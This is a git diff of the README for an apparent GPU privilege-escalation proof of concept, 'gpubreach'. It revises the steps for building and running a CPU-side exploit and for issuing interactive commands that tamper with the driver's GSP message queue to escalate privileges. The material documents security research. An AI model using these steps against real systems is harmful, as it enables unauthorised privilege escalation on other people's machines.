@@ -265,7 +265,7 @@ Then, we build the CPU-side exploit components. `d_pattern.bin` generates a 1GB 
 ```bash
 $ cd d2h-tools/ # at gpubreach/
 $ ./create_d_pattern.py --size 1GB --output d_pattern.bin
-$ cd d2h-tools/cpu-exploit/ # at gpubreach/
+$ cd cpu-exploit/ # at gpubreach/
 $ make -j
 ```
 ---
@@ -286,6 +286,7 @@ Press Enter Key to start finding and modifying that page's PTE.
 
 **On another terminal**, please execute the following which first loads the attacker memory with `0x6464646464646464`:
 ```bash
+$ cd ./d2h-tools
 $ ./cpu-exploit/cpu-exploit ./d_pattern.bin
 ```
 
@@ -307,9 +308,9 @@ In the command prompt that was opened using `./cpu-exploit` in either Step 2 or 
 
 ```bash
 > poc-init # Initializes the base of the buffer-under-operation by scanning the memory.
-> poc-cw-entry0-checksum # Scans the slots, discovers the current sequence numbers, and computes the payloads with the correct checksum.
-> poc-privesc  # Escalates itself by overwriting the GSP’s message queue.
-> poc-trigger 5 # Triggers CPU-GPU communication so that the driver advances the message queue and consumes the tampered content provided by the attacker.
+> poc-cw-entry0-checksum # Scans the slots, discovers the current sequence numbers, and infers the next couple sequence numbers will be used. It then generates computes a the payloads indicating that there are 16 more messages followed by it with the correct checksum and writes them to the next entries where the POC predicts the GPU Driver will consume.
+> poc-privesc  # Escalates itself by overwriting the last message in the 17 messages with the constructed   GSP’s message queue with spawned threads
+> poc-trigger 5  # Executing nvidia-smi triggers CPU-GPU communication. It prompts the driver to process a message, advance the message queue, and consume the attacker-provided malicious payload.
 ```
 
 #### Step 5: Verify privilege escalation
